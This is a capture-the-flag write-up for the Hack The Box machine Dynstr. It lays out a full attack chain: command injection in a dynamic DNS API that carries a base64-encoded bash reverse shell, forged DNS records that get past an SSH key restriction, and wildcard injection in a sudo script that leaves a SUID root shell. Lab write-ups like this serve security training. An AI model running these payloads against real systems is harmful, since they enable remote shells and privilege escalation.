Dynstr Write-Up

Oct 17, 2021

Dynstr

Dynstr is a medium difficulty machine on Hack The Box. To gain a foothold, we must leverage a command execution vulnerability. Next, we escalate to the bindmgr user by inserting a DNS record and using a found RSA-key. We escalate to the root user by exploiting a script with wildcard injection, that we can run as sudo without password.

Enumerating Port 80 (HTTP)

The web application hosts a dynamic DNS service. They are still in beta and recommend using the dynadns:sndanyd credentials for their API. Their API is based on that of noip.com and they allow creation of subdomains for 3 zones:

  • no-ip.htb
  • dnsalias.htb
  • dynamicdns.htb

Using the following request we can create a subdomain: curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=attacker.no-ip.htb&myip=10.10.14.1

Upon closer look of the query parameters we discover that the hostname parameter is vulnerable to command injection. The period is a bad character and causes the payload to fail, therefore I encode a basic bash reverse shell using base64.

echo -n "bash -i >& /dev/tcp/10.10.14.1/80 0>&1"  | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzgwIDA+JjE=

The next HTTP request will deliver and run the payload:

GET /nic/update?hostname=attacker|echo+`echo+'YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xLzgwIDA%2BJjE%3D'|base64+-d|bash`.dynamicdns.htb&myip=10.10.14.1 HTTP/1.1
Host: dynupdate.no-ip.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: curl/7.74.0

PrivEsc to Bindmgr

After sending a payload we get a shell as the www-data user. We quickly find the bindmgr user which has some troubleshooting files in its home directory. In the strace output we find an RSA private key, however this does not seem to work on via SSH. After inspecting the authorized_keys file, we discover that the key is restricted by DNS origin.

www-data@dynstr:/dev/shm$ cat /home/bindmgr/.ssh/authorized_keys  
from="*.infra.dyna.htb" ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen

We know the server is running a DNS server, so lets see if we can create a DNS record for ourself. In the /etc/bind/ directory we find keys for creating DNS records. Lets use the nsupdate tool to create a record for ourself:

nsupdate -t 1 -k /etc/bind/infra.key

server 127.0.0.1

update delete sftp.infra.dyna.htb

add sftp.infra.dyna.htb 30 IN A 10.10.14.1

update delete 1.14.10.10.in-addr.arpa PTR
update add 1.14.10.10.in-addr.arpa 30 PTR sftp.infra.dyna.htb
send

Now we can SSH into the machine as the bindmgr user using the recovered RSA key.

PrivEsc to Root

The bindmgr may run the /usr/local/bin/bindmgr.sh script as root without a password:

sudo -l sudo: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries for bindmgr on dynstr:     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  User bindmgr may run the following commands on dynstr:     (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh

The script contains the following line that is vulnerable to wildcard injection:

cp .version * /etc/bind/named.bindmgr

The * wildcard will be expanded to all files in the directory. In addition the root user will become the new owner of the copied file. To escalate our privileges we can create a SUID bash program and then set the --perserve=mode flag on the copy command so that the SUID permission will be preserved.

cd /tmp 
mkdir workdir && cd workdir 
echo '5'>.version 
cp /usr/bin/bash . 
chmod u+s bash 
touch -- --preserve=mode 
sudo /usr/bin/local/bindmgr.sh

We can now get a root shell be running: /etc/bind/named.bindmgr/bash -p
